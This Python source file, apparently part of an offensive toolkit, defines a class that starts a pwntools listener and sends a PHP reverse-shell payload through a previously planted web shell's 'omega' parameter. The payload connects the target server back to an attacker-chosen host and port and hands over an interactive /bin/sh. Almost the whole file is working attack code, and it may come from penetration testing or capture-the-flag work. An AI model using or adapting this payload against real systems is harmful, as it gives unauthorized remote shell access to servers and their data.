from pwnlib import timeout
import requests
from pwnlib.tubes.listen import listen


class ShellService:
    def __init__(self, web_shell_url: str, lhost: str, lport: int):
        self.web_shell_url = web_shell_url
        self.lhost = lhost
        self.lport = lport

    def prepareListener(self) -> listen:
        listener = listen(self.lport)

        return listener

    def executeRevShell(self):
        php_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
        payload = requests.utils.quote(f"php -r '{php_code}'")

        try:
            requests.get(f'{self.web_shell_url}?omega={payload}', timeout=2)
        except requests.exceptions.ReadTimeout:
            pass
